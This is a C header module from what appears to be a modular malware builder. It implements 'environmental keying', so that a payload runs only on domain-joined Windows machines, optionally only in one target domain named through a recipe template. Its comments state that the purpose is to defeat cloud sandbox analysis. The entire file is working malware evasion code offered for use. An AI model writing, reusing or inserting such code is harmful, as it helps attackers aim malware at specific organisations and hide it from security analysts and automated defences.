// chunk: evasion/env_key_domain
// depends: (none)
// provides: env_check_domain
// headers: windows.h
// risk: low
// note: Environmental keying — only execute payload if machine is domain-joined.
//       Defeats cloud sandbox analysis since sandboxes are rarely domain-joined.
//       Set ENV_KEY_DOMAIN var in recipe to target a specific domain.

#ifndef CHUNK_ENV_KEY_DOMAIN
#define CHUNK_ENV_KEY_DOMAIN

#include <windows.h>

#ifndef ENV_KEY_DOMAIN
#define ENV_KEY_DOMAIN "{{ENV_KEY_DOMAIN}}"
#endif

static int env_check_domain(void) {
    WCHAR computer_name[256] = {0};
    DWORD size = 256;
    if (!GetComputerNameExW(ComputerNameDnsDomain, computer_name, &size))
        return 0;
    if (size == 0 || computer_name[0] == L'\0')
        return 0;

    const char *target = ENV_KEY_DOMAIN;
    if (target[0] == '\0')
        return 1;

    char domain[256] = {0};
    WideCharToMultiByte(CP_ACP, 0, computer_name, -1, domain, 256, NULL, NULL);
    for (int i = 0; domain[i]; i++)
        if (domain[i] >= 'A' && domain[i] <= 'Z')
            domain[i] += 32;
    char lower_target[256] = {0};
    int j = 0;
    for (; target[j] && j < 255; j++)
        lower_target[j] = (target[j] >= 'A' && target[j] <= 'Z') ? target[j] + 32 : target[j];
    if (strstr(domain, lower_target))
        return 1;
    return 0;
}

#endif
